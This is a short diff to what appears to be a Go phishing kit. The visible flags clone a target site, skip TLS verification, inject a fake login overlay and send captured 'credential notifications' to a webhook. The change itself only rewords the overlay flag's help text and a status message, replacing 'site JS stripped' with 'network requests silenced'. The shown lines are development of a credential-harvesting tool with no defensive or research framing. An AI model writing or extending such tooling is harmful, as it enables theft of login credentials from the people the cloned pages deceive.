@@ -40,7 +40,7 @@ func run() error {
 	flag.StringVar(&cfg.UserAgent, "user-agent", cfg.UserAgent, "User-Agent string for cloning requests")
 	flag.StringVar(&cfg.WebhookURL, "webhook", "", "Webhook URL for credential notifications")
 	flag.BoolVar(&cfg.InsecureTLS, "insecure", false, "Skip TLS verification when cloning target")
-	flag.BoolVar(&cfg.Overlay, "overlay", false, "Strip site JS and inject a themed login overlay")
+	flag.BoolVar(&cfg.Overlay, "overlay", false, "Silence site network requests and inject a themed login overlay")
 	flag.BoolVar(&cfg.Verbose, "verbose", false, "Enable verbose debug output")
 	flag.Parse()
 
@@ -82,7 +82,7 @@ func run() error {
 		if err != nil {
 			return fmt.Errorf("apply overlay: %w", err)
 		}
-		fmt.Println("[*] Login overlay injected (site JS stripped)")
+		fmt.Println("[*] Login overlay injected (network requests silenced)")
 	} else {
 		rewritten, err = rewriter.RewriteForms(string(htmlBytes))
 		if err != nil {
